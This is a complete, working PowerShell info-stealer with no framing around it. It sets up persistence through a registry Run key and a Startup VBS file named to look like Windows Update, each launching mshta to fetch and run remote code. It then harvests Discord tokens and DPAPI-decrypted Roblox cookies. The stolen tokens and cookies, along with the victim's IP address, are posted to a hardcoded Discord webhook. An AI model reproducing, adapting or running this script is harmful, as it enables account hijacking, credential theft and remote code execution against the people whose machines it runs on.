$ErrorActionPreference = "SilentlyContinue"
$WH = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
$PC = $env:COMPUTERNAME

function Send-Webhook($title, $desc, $color) {
    $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' | Out-Null } catch {}
}

# --- 1. PERSISTENCE ---
try {
    $CMD = 'mshta https://dicerigx.app/'
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value $CMD -ErrorAction SilentlyContinue
    $StartupVBS = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Set-Content -Path $StartupVBS -Value "CreateObject(`"WScript.Shell`").Run `"$CMD`", 0, False" -ErrorAction SilentlyContinue
} catch {}

# --- 2. DISCORD TOKENS & ROBLOX COOKIES ---
Add-Type -AssemblyName System.Security
$discordPaths = @("$env:APPDATA\discord\Local Storage\leveldb", "$env:APPDATA\discordptb\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb")

foreach ($dp in $discordPaths) {
    if (Test-Path $dp) {
        Get-ChildItem $dp -Filter *.ldb | ForEach-Object {
            $raw = Get-Content $_.FullName -Raw
            $matches = [regex]::Matches($raw, '[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
            foreach ($m in $matches) {
                Send-Webhook ":gift: Discord Token" "**Token:** $($m.Value) `n**PC:** $PC" 5793266
            }
        }
    }
}

$rbxPaths = @("$env:LOCALAPPDATA\Roblox\LocalStorage\robloxcookies.dat", "$env:USERPROFILE\AppData\Local\Roblox\LocalStorage\robloxcookies.dat")
foreach ($rp in $rbxPaths) {
    if (Test-Path $rp) {
        $raw = Get-Content $rp -Raw
        if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
            $b64 = $Matches[1]
            $eb = [Convert]::FromBase64String($b64)
            $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
            $cookie = [Text.Encoding]::UTF8.GetString($db)
            if ($cookie -match '_\|WARNING[^;\s]{50,}') {
                $c = $Matches[0]
                Send-Webhook ":cookie: Roblox Cookie" "**Size:** $($c.Length) `n**PC:** $PC`n**Cookie:**``$c``" 65280
            }
        }
    }
}

# --- 3. SYSTEM INFO ---
$ip = (Invoke-RestMethod -Uri "https://api.ipify.org").Trim()
Send-Webhook ":dart: Target" "**IP:** $ip `n**PC:** $PC" 3447003
